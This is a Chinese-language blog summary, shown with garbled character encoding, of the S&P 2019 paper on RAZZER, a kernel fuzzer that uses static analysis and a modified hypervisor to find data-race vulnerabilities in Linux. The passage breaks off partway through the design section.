    <content type="html"><![CDATA[<p>å‡ºå¤„ï¼šS&amp;P 2019 </p><p>ä½œè€…ï¼šDae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin </p><p>å•ä½ï¼šComputer Science, KAIST, Computer Science, Purdue University, Electrical and Computer Engineering, Seoul National University </p><p>èµ„æ–™ï¼š<a href="https://github.com/fengjixuchui/FuzzingPaper/blob/master/Paper/SP19_Razzer.pdf" target="_blank" rel="noopener">Paper</a> </p><h2 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h2><p>å†…æ ¸ä¸­çš„æ•°æ®ç«äº‰æ˜¯ä¸€ç±»ä¸¥é‡çš„bugï¼Œä¼šå½±å“ç›¸å…³ç³»ç»Ÿçš„å¯é æ€§å’Œå®‰å…¨æ€§ã€‚åˆ©ç”¨å†…æ ¸ä¸­çš„ç«äº‰ï¼Œç®€å•çš„å¯ä»¥æ˜¯å†…æ ¸å˜å¾—æ²¡æœ‰å“åº”ï¼Œ ä¸¥é‡çš„åˆ™ä¼šè§¦å‘æƒé™æå‡æ”»å‡»ä»¥è·å–rootæƒé™ã€‚</p><p>æœ¬æ–‡å°†ä¸»è¦åŸºäºRAZZERï¼Œä¸€ç§åœ¨å†…æ ¸ä¸­æŸ¥æ‰¾ç«äº‰æ¼æ´çš„å·¥å…·ï¼Œæ¥ä»‹ç»å¯¹å†…æ ¸æ•°æ®ç«äº‰æ¼æ´çš„æ¨¡ç³Šæµ‹è¯•ã€‚ä¸€èˆ¬çš„æ¨¡ç³Šæµ‹è¯•æ˜¯é€šè¿‡è¾“å…¥ç•¸å½¢æ•°æ®æ¥è§¦å‘ç›®æ ‡ç¨‹åºçš„å´©æºƒè¿›è€Œå†é€šè¿‡æ‰‹åŠ¨åˆ†æç¡®å®šæ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜çš„ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼ä¸ä»…å¾ˆéš¾å¯¹ç«äº‰æ¼æ´è¿›è¡Œé’ˆå¯¹æ€§æµ‹è¯•ï¼Œè€Œä¸”å¾ˆéš¾å‘ç°ç”±äºç«äº‰æ¼æ´è€Œå¯¼è‡´çš„æ½œåœ¨å®‰å…¨é—®é¢˜ã€‚ä¸ä¼ ç»Ÿæ–¹æ¡ˆçš„ä¸åŒï¼ŒRAZZERçš„æ ¸å¿ƒæ€æƒ³æ˜¯å¼•å¯¼Fuzzingå·¥å…·å»æ‰§è¡Œå¯èƒ½å­˜åœ¨æ•°æ®ç«äº‰æ¼æ´çš„ä»£ç ã€‚å…·ä½“æ¥è¯´å°±æ˜¯é‡‡ç”¨é™æ€åˆ†æå’Œç¡®å®šæ€§çº¿ç¨‹äº¤é”™æŠ€æœ¯ã€‚é™æ€åˆ†ææŠ€æœ¯æ¥å¯¹æ½œåœ¨çš„å†…æ ¸æ•°æ®ç«äº‰ç‚¹è¿›è¡Œå®šä½ï¼Œä»è€Œå¼•å¯¼Fuzzå™¨æ›´æœ‰æ•ˆåœ°å¯¹å†…æ ¸ä¸­çš„æ•°æ®ç«äº‰ç‚¹è¿›è¡ŒFuzzã€‚ç¡®å®šæ€§çº¿ç¨‹äº¤é”™æŠ€æœ¯åˆ™æ˜¯ç”¨æ¥æ§åˆ¶çº¿ç¨‹è°ƒåº¦ï¼Œä»¥æä¾›ç²¾ç¡®çš„å¹¶è¡Œæ‰§è¡Œä¿¡æ¯ï¼Œé™ä½ä¸ç¡®å®šæ€§ï¼Œä»è€Œä¿è¯å†…æ ¸ç«äº‰çš„ç¨³å®šè§¦å‘ã€‚ä½†æ˜¯æ­¤é¡¹å·¥ä½œå¹¶æ²¡æœ‰è§£å†³åŒæ­¥æœºåˆ¶å¯¹å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•çš„å½±å“ã€‚</p><h2 id="I-ä»‹ç»"><a href="#I-ä»‹ç»" class="headerlink" title="I ä»‹ç»"></a>I ä»‹ç»</h2><p>æ•°æ®ç«äº‰å¯¹åº•å±‚ç³»ç»Ÿçš„å¯é æ€§å’Œå®‰å…¨æ€§ä¼šé€ æˆå½±å“ï¼Œå…·ä½“æ¥è¯´ä¸»è¦æ˜¯ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š</p><ol><li>å¦‚æœæ•°æ®ç«äº‰å¼•å…¥äº†å¾ªç¯é”å®šè¡Œä¸ºï¼Œåˆ™ç”±äºå¯¼è‡´çš„æ­»é”ï¼Œé€ æˆå†…æ ¸æ— å“åº”ã€‚</li><li>å¦‚æœå‡ºç°åœ¨å†…æ ¸ä¸­çš„å®‰å…¨æ–­è¨€ï¼Œå†…æ ¸å°†è‡ªè¡Œé‡å¯ï¼Œä»è€Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</li><li>æ•°æ®ç«äº‰è¿˜å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ”»å‡»ï¼Œæ¯”å¦‚è§¦å‘ç¼“å†²åŒºæº¢å‡ºæˆ–è€…UAFç­‰ç±»å‹çš„æ¼æ´è¿›è€Œå¯¼è‡´æƒé™æå‡æ”»å‡»ã€‚ä¾‹å¦‚CVE-2016-8655 [1]ï¼ŒCVE-2017-2636 [2]å’ŒCVE-2017-17712 [3]ã€‚</li></ol><p>å› ä¸ºæ•°æ®ç«äº‰æºäºå†…æ ¸çš„éç¡®å®šæ€§è¡Œä¸ºï¼Œæ‰€ä»¥ç ”ç©¶æ•°æ®ç«äº‰ä¸ä»…éœ€è¦ç²¾ç¡®çš„æ§åˆ¶æµå’Œæ•°æ®æµä¿¡æ¯ï¼Œè¿˜éœ€è¦ç²¾ç¡®çš„å¹¶å‘æ‰§è¡Œä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å—åˆ°åº•å±‚ç³»ç»Ÿçš„è®¸å¤šå…¶ä»–å¤–éƒ¨å› ç´ ï¼ˆä¾‹å¦‚è°ƒåº¦ï¼ŒåŒæ­¥åŸè¯­ç­‰ï¼‰çš„ä¸¥é‡å½±å“ã€‚</p><p>æœ¬æ–‡ä»‹ç»çš„RAZZERé¦–å…ˆè¿›è¡Œä½¿ç”¨LLVMä¼ é€’å®ç°äº†é™æ€åˆ†æä»¥è·å¾—æ½œåœ¨æ•°æ®ç«äº‰ç‚¹ï¼Œä¹‹åé’ˆå¯¹è¿™äº›ç«äº‰ç‚¹æ‰§è¡Œä¸¤æ¬¡åŠ¨æ€æ¨¡ç³Šæµ‹è¯•ã€‚ç¬¬ä¸€æ¬¡æ˜¯å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ï¼Œå…¶é‡ç‚¹æ˜¯æ‰¾åˆ°æ‰§è¡Œæ½œåœ¨ç«äº‰ç‚¹çš„å•çº¿ç¨‹è¾“å…¥ç¨‹åºï¼ˆä¸è€ƒè™‘ç¨‹åºæ˜¯å¦ç¡®å®è§¦å‘äº†ç«äº‰ï¼‰ã€‚ç¬¬äºŒæ¬¡æ˜¯å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ï¼Œä½¿ç”¨è‡ªå»ºçš„å¤šçº¿ç¨‹ç¨‹åºï¼Œè¿›ä¸€æ­¥åˆ©ç”¨ä¿®æ”¹QEMUå’ŒKVMå¼€å‘çš„ç®¡ç†ç¨‹åºæ¥ä¿ƒä½¿å…¶åœ¨æ½œåœ¨æ•°æ®ç«äº‰ç‚¹çš„æ‰§è¡Œã€‚å› æ­¤ï¼ŒRAZZERèƒ½å¤Ÿé¿å…å¤–éƒ¨å› ç´ çš„å½±å“ä½¿ç«äº‰è¡Œä¸ºç¨³å®šè§¦å‘ã€‚</p><p>RAZZERçš„ä¸»è¦ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ol><li>é¢å‘ç«äº‰çš„Fuzzerï¼šè¿™æ˜¯ä¸€ç§æ–°çš„æ¨¡ç³Šæµ‹è¯•æœºåˆ¶ï¼Œä¸“é—¨ç”¨äºæ£€æµ‹å†…æ ¸ä¸­çš„ç«äº‰ã€‚ å®ƒåˆ©ç”¨é™æ€å’ŒåŠ¨æ€åˆ†ææŠ€æœ¯å°†å…¶æ¨¡ç³Šæµ‹è¯•é›†ä¸­åœ¨æ½œåœ¨çš„ç«äº‰ç‚¹ä¸Šã€‚</li><li>å¼ºå¤§çš„å®ç°ï¼šåŸºäºå„ç§è¡Œä¸šä¼˜åŠ¿æ¡†æ¶å®æ–½äº†RAZZERï¼Œä¸»è¦æ˜¯KVM / QEMUå’ŒLLVMã€‚ å®ƒä¸éœ€è¦æ‰‹åŠ¨ä¿®æ”¹è¦åˆ†æçš„ç›®æ ‡å†…æ ¸ï¼Œä»è€Œå¯ä»¥è½»æ¾æ”¯æŒæœ€æ–°çš„Linuxå†…æ ¸è€Œæ— éœ€ä»»ä½•äººå·¥å¹²é¢„ã€‚</li><li>å®é™…æ•ˆæœï¼šRAZZERå‘ç°äº†30ä¸ªç«äº‰æ¼æ´ï¼Œå…¶ä¸­16ä¸ªå·²ç»è¢«ç¡®è®¤ï¼Œå¹¶ç”±ç›¸åº”çš„å†…æ ¸å¼€å‘äººå‘˜è¿›è¡Œç›¸åº”çš„ä¿®å¤ã€‚ </li></ol><h2 id="II-é—®é¢˜å®šä¹‰-amp-è®¾è®¡éœ€æ±‚"><a href="#II-é—®é¢˜å®šä¹‰-amp-è®¾è®¡éœ€æ±‚" class="headerlink" title="II é—®é¢˜å®šä¹‰&amp;è®¾è®¡éœ€æ±‚"></a>II é—®é¢˜å®šä¹‰&amp;è®¾è®¡éœ€æ±‚</h2><h3 id="A-é—®é¢˜å®šä¹‰"><a href="#A-é—®é¢˜å®šä¹‰" class="headerlink" title="A.é—®é¢˜å®šä¹‰"></a>A.é—®é¢˜å®šä¹‰</h3><p>å½“ç›®æ ‡ç¨‹åºä¸­çš„ä¸¤ä¸ªå­˜å‚¨å™¨è®¿é—®æŒ‡ä»¤æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶æ—¶ï¼Œå‘ç”Ÿæ•°æ®ç«äº‰ï¼š<br>ï¼ˆiï¼‰è®¿é—®çš„å†…å­˜åœ°å€ç›¸åŒã€‚<br>ï¼ˆiiï¼‰è‡³å°‘å…¶ä¸­ä¸€æ¡æŒ‡ä»¤æ˜¯å¯¹å†…å­˜çš„å†™ã€‚<br>ï¼ˆiiiï¼‰ä¸¤æ¡æŒ‡ä»¤å¯ä»¥å¹¶å‘æ‰§è¡Œã€‚<br>æ•°æ®ç«äº‰å¹¶ä¸éƒ½ä¼šè§¦å‘æ¼æ´ï¼Œæœ‰äº›æ˜¯å¼€å‘äººå‘˜é¢„æœŸçš„ï¼ˆæˆ–æœ‰æ„çš„ï¼‰æ•°æ®ç«äº‰ï¼Œå®¹å¿è®¡ç®—ç»“æœçš„æ½œåœ¨åå·®ã€‚åªæœ‰é‚£äº›ä¼šè§¦å‘éé¢„æœŸè¡Œä¸ºçš„æ•°æ®ç«äº‰æ‰ä¼šè§¦å‘æ¼æ´ã€‚æ­¤å¤„å¼•å…¥å¦‚ä¸‹å››ä¸ªæœ¯è¯­æ¥è¿›è¡Œæ ‡è¯†ï¼š<br>RacePaircand å¯èƒ½å¯¼è‡´ç«äº‰çš„ä¸¤ä¸ªå†…å­˜è®¿é—®æŒ‡ä»¤<br>RacePairtrue ä¸¤ä¸ªè¢«ç¡®è®¤å¼•èµ·ç«äº‰çš„æŒ‡ä»¤<br>RacePairbenign é¢„æœŸçš„æ•°æ®ç«äº‰<br>RacePairharm ä¼šè§¦å‘æ¼æ´çš„éé¢„æœŸæ•°æ®ç«äº‰</p><p>æ­¤å¤„ä»¥ç«äº‰æ¼æ´CVE-2017-2636ä½œä¸ºç¤ºä¾‹æ¥é˜è¿°æ•°æ®ç«äº‰æ˜¯å¦‚ä½•å‘ç”Ÿçš„å¹¶ä¸”å‘ç”Ÿä¹‹åå°†ä¼šè§¦å‘ä»€ä¹ˆå±å®³ã€‚æ­¤æ¼æ´çš„è¯¦æƒ…å¦‚å›¾1æ‰€ç¤ºï¼Œé€ æˆæ¼æ´çš„åŸå› æ˜¯æœ¬åº”æ˜¯ä¸€ä¸ªç‰¹å®šé¡ºåºçš„ç³»ç»Ÿè°ƒç”¨çš„ç‰¹å®šåˆ—è¡¨ï¼Œä½†å´å› ä¸ºä¸€ä¸ªå¯¹æŠ—çš„å¤šçº¿ç¨‹ç”¨æˆ·ç¨‹åºå¼•å‘äº†æ•°æ®ç«äº‰ï¼Œæœ€ç»ˆåœ¨å†…æ ¸å¤„ç†æ­¤ç±»ç³»ç»Ÿè°ƒç”¨ï¼Œæ¯”å¦‚ioctlå’Œwriteæ—¶å¯¼è‡´äº†double-freeé—®é¢˜ã€‚</p><p><img src="https://i.loli.net/2019/06/30/5d18b5a88ce6d62057.png" alt="8CEEBBC7-64F3-4B76-ACDB-C930AC6C60FB.png"></p><p>å›¾1ï¼šå…³äºCVE-2017-2636çš„ç®€åŒ–ç«äº‰ç¤ºä¾‹ã€‚ å½“ç”¨æˆ·ç¨‹åºåŒæ—¶æ‰§è¡Œä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œn_hdlc-&gt; tbufä¸Šçš„æ•°æ®ç«äº‰å¯èƒ½ä¼šå‘ç”Ÿï¼Œä½†å…·ä½“è¦å–å†³äºæ‰§è¡Œé¡ºåºï¼Œè¿™ä¼šæƒ…å†µä¼šå¯¼è‡´double-freeé—®é¢˜ï¼Œä»è€Œå…è®¸æ”»å‡»è€…å¯åŠ¨æƒé™æå‡æ”»å‡»ã€‚</p><h3 id="B-è®¾è®¡éœ€æ±‚"><a href="#B-è®¾è®¡éœ€æ±‚" class="headerlink" title="B.è®¾è®¡éœ€æ±‚"></a>B.è®¾è®¡éœ€æ±‚</h3><p><strong>è®¾è®¡è¦æ±‚</strong> ä¸ºäº†é¿å…æ£€æµ‹ç«äº‰è¿‡ç¨‹ä¸­å‡ºç°ä»»ä½•è¯¯æŠ¥ï¼Œç¡®å®šå‡ºä»¥ä¸‹ä¸¤ä¸ªç†æƒ³çš„è®¾è®¡è¦æ±‚ï¼š</p><p>R1ï¼šæ‰¾åˆ°æ‰§è¡ŒRacePaircandçš„è¾“å…¥ç¨‹åºã€‚ æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåˆ†æåº”è¯¥å‘ç°ä¸€ä¸ªå¤šçº¿ç¨‹ç”¨æˆ·ç¨‹åºï¼Œç¨‹åºä¸­çš„æ¯ä¸ªçº¿ç¨‹æ‰§è¡ŒRacePaircandä¸­çš„æ¯ä¸ªæŒ‡ä»¤ã€‚<br>R2ï¼šæ‰¾åˆ°åŒæ—¶æ‰§è¡ŒRacePaircandçš„è¾“å…¥ç¨‹åºçš„çº¿ç¨‹äº¤é”™ã€‚</p><p>ä¹‹æ‰€ä»¥è¦æ»¡è¶³è¿™ä¸¤ä¸ªè®¾è®¡è¦æ±‚æ˜¯å› ä¸ºå•ç‹¬çš„R1ä¸èƒ½ç¡®ä¿å¯ä»¥åŒæ—¶æ‰§è¡ŒRacePaircandä»¥è§¦å‘æ•°æ®ç«äº‰ï¼Œå› æ­¤åˆ†æåº”è¯¥è¯†åˆ«åŒæ—¶æ‰§è¡ŒRacePaircandçš„ç‰¹å®šçº¿ç¨‹äº¤é”™æƒ…å†µã€‚</p><p><strong>éœ€æ±‚ç ”ç©¶â€“ä¼ ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•</strong> ä¼ ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•ä¸“æ³¨äºå¯¹R1çš„è§£å†³ï¼Œè¯•å›¾æ‰¾åˆ°æ‰©å±•å†…æ ¸ä»£ç è¦†ç›–èŒƒå›´çš„è¾“å…¥ã€‚ç”±äºæ ¹æœ¬ä¸è€ƒè™‘R2ï¼Œå› æ­¤å‘ç°æ•°æ®ç«äº‰åŸºæœ¬éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><p><strong>éœ€æ±‚ç ”ç©¶â€“çº¿ç¨‹äº¤å‰å·¥å…·</strong> å…³äºéšæœºçº¿ç¨‹äº¤é”™å·¥å…·ï¼ˆä¾‹å¦‚SKI [4]æˆ–PCTç®—æ³•[5]ï¼‰ï¼Œä»–ä»¬çš„é‡ç‚¹æ˜¯æ»¡è¶³R2ï¼Œè¯•å›¾æ¢ç´¢ç‰¹å®šï¼ˆå’Œé™æ€ï¼‰è¾“å…¥ç¨‹åºçš„æ‰€æœ‰å¯èƒ½çš„çº¿ç¨‹äº¤é”™æƒ…å†µã€‚ç”±äºä»–ä»¬ä¸è€ƒè™‘R1ï¼Œå› æ­¤ä»–ä»¬åªèƒ½è¿è¡Œç°æœ‰ç¨‹åºï¼ˆä¾‹å¦‚åŸºå‡†æµ‹è¯•ï¼‰ï¼Œå› æ­¤æ— æ³•æœ‰æ•ˆåœ°æ¢ç´¢å¤§é‡ä»£ç ç©ºé—´ï¼Œå¯¼è‡´å¤§éƒ¨åˆ†å†…æ ¸æœªç»æµ‹è¯•ã€‚æ­¤å¤–ï¼Œå› ä¸ºçº¿ç¨‹äº¤é”™å·¥å…·åŸºäºéšæœºè°ƒåº¦ï¼Œæ‰€ä»¥å®ƒä»¬å•ç‹¬å¯¹R2çš„æ•ˆç‡ï¼ˆå³ç®€å•åœ°æœç´¢æ‰€æœ‰çº¿ç¨‹äº¤é”™æƒ…å†µï¼‰ä¹Ÿå—åˆ°ä¸¥é‡é™åˆ¶ã€‚</p><h2 id="III-è®¾è®¡-amp-å®ç°"><a href="#III-è®¾è®¡-amp-å®ç°" class="headerlink" title="III. è®¾è®¡&amp;å®ç°"></a>III. è®¾è®¡&amp;å®ç°</h2><p>RAZZERèƒŒåçš„å…³é”®ç†å¿µæ˜¯é‡‡ç”¨åŠ¨é™æ··åˆæµ‹è¯•æ–¹æ¡ˆæ¥å¯¹å†…æ ¸ä¸­æ½œåœ¨æ•°æ®ç«äº‰ç‚¹çš„åˆ†æã€‚é¦–å…ˆï¼ŒRAZZERæ‰§è¡Œé™æ€åˆ†æä»¥è·å¾—ååˆ†è¿‘ä¼¼çš„æ½œåœ¨æ•°æ®ç«äº‰ç‚¹ã€‚ä¹‹åï¼ŒRAZZERè¿›è¡Œä¸¤é˜¶æ®µåŠ¨æ€åˆ†æã€‚ç¬¬ä¸€é˜¶æ®µæ˜¯å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ï¼Œå…¶é‡ç‚¹æ˜¯è¯†åˆ«æ‰§è¡Œæ½œåœ¨ç«äº‰ç‚¹ï¼ˆå°è¯•æ»¡è¶³R1ï¼‰çš„å•çº¿ç¨‹è¾“å…¥ç¨‹åºã€‚ç¬¬äºŒé˜¶æ®µæ˜¯å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ã€‚ç¬¬äºŒé˜¶æ®µåœ¨ç¬¬ä¸€é˜¶æ®µçš„å¸®åŠ©ä¸‹æ„å»ºå¤šçº¿ç¨‹ç¨‹åºï¼Œåˆ©ç”¨è‡ªå®šä¹‰ç®¡ç†ç¨‹åºç¡®å®šæ€§åœ°æ§åˆ¶çº¿ç¨‹äº¤é”™ï¼ˆå°è¯•æ»¡è¶³R2ï¼‰ã€‚æ‰¾åˆ°ç«äº‰ä¹‹åï¼ŒRAZZERå°±ä¼šè¾“å‡ºä¸€ä¸ªå…·ä½“çš„ç”¨æˆ·ç¨‹åºï¼ˆå³è§¦å‘æ•°æ®ç«äº‰çš„ç¨‹åºï¼‰ã€‚Razzerè¿˜ä¼šæ£€æµ‹å†…æ ¸æ˜¯å¦å‡ºç°äº†é”™è¯¯ï¼Œå¦‚æœRacePairtrueåœ¨ç¨‹åºåç»­æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¼è‡´äº†å†…æ ¸é”™è¯¯ï¼Œåˆ™å¾—åˆ°äº†ä¸€ä¸ªRacePairharmã€‚</p><p><img src="https://i.loli.net/2019/06/30/5d18b5cea1ddc33409.png" alt="CE56457C-84BA-4FD7-B52C-7F73DB09332B.png"></p><p>å›¾2ï¼šRAZZERçš„æ•´ä½“æ¶æ„</p><h3 id="A-é™æ€åˆ†æè¯†åˆ«æ½œåœ¨ç«äº‰ç‚¹"><a href="#A-é™æ€åˆ†æè¯†åˆ«æ½œåœ¨ç«äº‰ç‚¹" class="headerlink" title="A. é™æ€åˆ†æè¯†åˆ«æ½œåœ¨ç«äº‰ç‚¹"></a>A. é™æ€åˆ†æè¯†åˆ«æ½œåœ¨ç«äº‰ç‚¹</h3><p>é™æ€åˆ†æçš„ç›®æ ‡æ˜¯è¯†åˆ«å†…æ ¸ä¸­çš„æ‰€æœ‰RacePaircandï¼Œå…¶ä¸­æ¯ä¸ªRacePaircandç”±ä¸¤ä¸ªå†…å­˜è®¿é—®æŒ‡ä»¤ç»„æˆï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦åœ¨è¿è¡Œæ—¶ç«äº‰ã€‚RAZZERåœ¨æ­¤å¤„ä½¿ç”¨çš„æ˜¯ç‚¹å¯¹åˆ†æï¼Œä½†æ˜¯ä¸€èˆ¬è€Œè¨€ç‚¹å¯¹åˆ†æåœ¨å‡†ç¡®æ€§å’Œæ€§èƒ½æ–¹é¢å—åˆ°é™åˆ¶ï¼Œå¹¶ä¸”ä¼šå…·æœ‰å¾ˆé«˜çš„è¯¯æŠ¥ç‡ï¼Œå› æ­¤RAZZERåœ¨æ­¤é‡‡ç”¨ç‰¹æœ‰çš„æ–¹å¼å¯¹è¿™ä¸ªé—®é¢˜æ¥è¿›è¡Œè§£å†³ã€‚</p><p>é¦–å…ˆæ˜¯ä¸ºäº†è§£å†³å‡†ç¡®æ€§é—®é¢˜ï¼ŒRAZZERå…è®¸ç‚¹åˆ†æååˆ†é€¼è¿‘RacePaircandé›†ï¼ˆå³ï¼ŒæŸäº›RacePaircandå¯èƒ½ä¸æ˜¯RacePairtrueï¼‰ï¼Œå¹¶é€šè¿‡å…¶åŠ¨æ€æ¨¡ç³Šæµ‹è¯•è§£å†³è¯¯æŠ¥é—®é¢˜ã€‚å…¶æ¬¡ï¼Œä¸ºäº†ç¼“è§£æ€§èƒ½é—®é¢˜ï¼ŒRAZZERæ‰§è¡Œå†…æ ¸çš„å®šåˆ¶åˆ†åŒºåˆ†æã€‚ å®ƒæ ¹æ®æ¨¡å—ç»„ä»¶å¯¹å†…æ ¸å¯¹è±¡è¿›è¡Œåˆ†åŒºï¼Œå¹¶å¯¹æ¯ä¸ªæ¨¡å—æ‰§è¡Œé¢„åˆ†æã€‚ å¹¶ä¸”åœ¨å¯¹æ¯ä¸ªæ¨¡å—æ‰§è¡Œé¢„åˆ†ææ—¶ï¼ŒRAZZERä¹Ÿå§‹ç»ˆæä¾›æ ¸å¿ƒå†…æ ¸æ¨¡å—ã€‚</p><p>å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œæ­¤å¤„çš„é™æ€åˆ†æä¸è€ƒè™‘å†…æ ¸ä¸­çš„åŒæ­¥åŸè¯­ï¼ˆä¾‹å¦‚ï¼Œread_lock()ï¼Œbr_read_lock()ï¼Œspin_lock_irqsave()ï¼Œup()ï¼‰ã€‚åˆ©ç”¨è¿™äº›ä¿¡æ¯å¯ä»¥é™ä½è¯¯æŠ¥ç‡ï¼ˆå› ä¸ºå®ƒå¯ä»¥å¸®åŠ©ç¡®å®šä¸èƒ½ç«äº‰çš„å†…å­˜å¯¹ï¼‰ã€‚</p><h3 id="B-Hypervisorä¸­çš„æ¯æ ¸å¿ƒè°ƒåº¦ç¨‹åº"><a href="#B-Hypervisorä¸­çš„æ¯æ ¸å¿ƒè°ƒåº¦ç¨‹åº" class="headerlink" title="B. Hypervisorä¸­çš„æ¯æ ¸å¿ƒè°ƒåº¦ç¨‹åº"></a>B. Hypervisorä¸­çš„æ¯æ ¸å¿ƒè°ƒåº¦ç¨‹åº</h3><p>ç”±äºå†…æ ¸çº¿ç¨‹äº¤é”™çš„éç¡®å®šæ€§å’Œéšæœºæ€§ï¼Œç«äº‰æ¡ä»¶å¾ˆå°‘è¡¨ç°å‡ºæ¥ã€‚å› æ­¤ï¼ŒRAZZERåœ¨å®šåˆ¶çš„è™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¿è¡Œç›®æ ‡å†…æ ¸ï¼Œä»¥ä¾¿RAZZERé¿å…æ¥è‡ªå¤–éƒ¨äº‹ä»¶çš„éç¡®å®šæ€§è¡Œä¸ºã€‚å…·ä½“æ¥è¯´å°±æ˜¯ RAZZERä¿®æ”¹è™šæ‹Ÿæœºç®¡ç†ç¨‹åºä¸ºguestå†…æ ¸æä¾›äº†ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>ä¸ºæ¯ä¸ªCPUæ ¸å¿ƒè®¾ç½®ä¸€ä¸ªæ–­ç‚¹:RAZZERæä¾›äº†ä¸€ä¸ªæ–°çš„è¶…çº§è°ƒç”¨æ¥å£hcall_set_bp()ï¼Œä»¥ä¾¿guestå†…æ ¸å¯ä»¥æ ¹æ®éœ€è¦è®¾ç½®æ¯ä¸ªæ ¸å¿ƒçš„æ–­ç‚¹ã€‚è¿™ä¸ªè¶…çº§è°ƒç”¨æ¥å£ä¼šåœ¨è™šæ‹Ÿæœºguestå†…æ ¸ä½¿ç”¨ä¸¤ä¸ªå‚æ•°æ—¶å¦‚ä¸‹æ¥ä¸ªå‚æ•°æ—¶è¢«è°ƒç”¨ã€‚<br>(1) vCPU_IDæŒ‡å®šRAZZERåº”åœ¨å…¶ä¸Šå®‰è£…æ–­ç‚¹çš„è™šæ‹ŸCPUï¼ˆvCPUï¼‰;<br>(2) guest_addræŒ‡å®šå®¢æˆ·æ“ä½œç³»ç»Ÿçš„åœ°å€ç©ºé—´ä¸­è¦å®‰è£…æ–­ç‚¹çš„åœ°å€ã€‚<br>æ”¶åˆ°æ­¤è¶…çº§è°ƒç”¨åï¼Œè™šæ‹Ÿæœºç®¡ç†ç¨‹åºä¼šåœ¨guest_addrä¸Šå®‰è£…ç¡¬ä»¶æ–­ç‚¹ï¼Œè¯¥æ–­ç‚¹ä»…å¯¹æŒ‡å®šçš„vCPUæœ‰æ•ˆã€‚</li><li>åœ¨guestå†…æ ¸é‡åˆ°æ–­ç‚¹åæ¢å¤æ‰§è¡Œå†…æ ¸çº¿ç¨‹:åœ¨ä¸¤ä¸ªå®¢æˆ·å†…æ ¸çº¿ç¨‹åœåœ¨å®ƒä»¬å„è‡ªçš„æ–­ç‚¹åœ°å€ï¼ˆå³RacePaircandï¼‰ä¹‹åï¼ŒRAZZERæ¢å¤ä¸¤ä¸ªvCPUçš„æ‰§è¡Œï¼Œä½¿å¾—ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡ŒRacePaircandã€‚ RAZZERåœ¨è¿™é‡Œåšå‡ºçš„ä¸€ä¸ªé‡è¦å†³å®šæ˜¯ï¼šåº”è¯¥é¦–å…ˆæ¢å¤å“ªä¸ªå†…æ ¸çº¿ç¨‹ï¼Ÿè¿™å¯¹äºè¯†åˆ«æ•°æ®ç«äº‰éå¸¸é‡è¦ï¼Œå› ä¸ºæŸäº›ç«äº‰bugä»…åœ¨ç‰¹å®šæ‰§è¡Œä»»åŠ¡ä¸Šå±•ç¤ºã€‚æ¢å¤çš„å·¥ä½œæµç¨‹å¦‚å›¾3æ‰€ç¤ºã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b5e89fc7f54203.png" alt="5E705F2C-2A22-49B7-84DA-E6F804C3895A.png"></p><p>å›¾3ï¼šRAZZERç®¡ç†ç¨‹åºçš„å·¥ä½œæµç¨‹</p><ol start="3"><li>æ£€æŸ¥guestå†…æ ¸æ˜¯å¦ç¡®å®å‘ç”Ÿäº†ç«äº‰:å½“ä¸¤ä¸ªæ–­ç‚¹åŒæ—¶è¢«è§¦å‘æ—¶ï¼Œæˆ‘ä»¬çš„ç®¡ç†ç¨‹åºæ£€æŸ¥ç»™å®šçš„RacePaircandæ˜¯å¦å®é™…å¯¼è‡´ç«äº‰ã€‚ æ›´å…·ä½“åœ°è¯´ï¼Œå½“RacePaircandä¸­çš„ä¸¤ä¸ªå­˜å‚¨å™¨æŒ‡ä»¤éƒ½å‘½ä¸­æ–­ç‚¹æ—¶ï¼Œæˆ‘ä»¬çš„ç®¡ç†ç¨‹åºä¼šå¯¹è¿™äº›æŒ‡ä»¤è¦è®¿é—®çš„ç›®æ ‡åœ°å€è¿›è¡Œåˆ†æã€‚ å¦‚æœè¿™äº›åœ°å€ç›¸åŒï¼Œé‚£ä¹ˆRAZZERä¼šå¾—å‡ºç»“è®ºï¼Œç»™å®šçš„RacePaircandçœŸæ­£å‚åŠ ç«äº‰ï¼Œå°†è¿™æ ·çš„ä¸€å¯¹æ¨å¹¿åˆ°RacePairtrueã€‚ ä»æŠ€æœ¯ä¸Šè®²ï¼Œæˆ‘ä»¬çš„è™šæ‹Ÿæœºç®¡ç†ç¨‹åºé€šè¿‡åæ±‡ç¼–æ¯ä¸ªRacePaircandä½ç½®çš„æŒ‡ä»¤å¹¶è·å¾—å­˜å‚¨åœ¨æ¯ä¸ªvCPUä¸­çš„å…·ä½“å¯„å­˜å™¨å€¼æ¥è®¡ç®—ç›®æ ‡åœ°å€å€¼ã€‚</li></ol><h3 id="C-é€šè¿‡ä¸¤ä¸ªé˜¶æ®µçš„Fuzzæ¥å‘ç°ç«äº‰æ¼æ´"><a href="#C-é€šè¿‡ä¸¤ä¸ªé˜¶æ®µçš„Fuzzæ¥å‘ç°ç«äº‰æ¼æ´" class="headerlink" title="C. 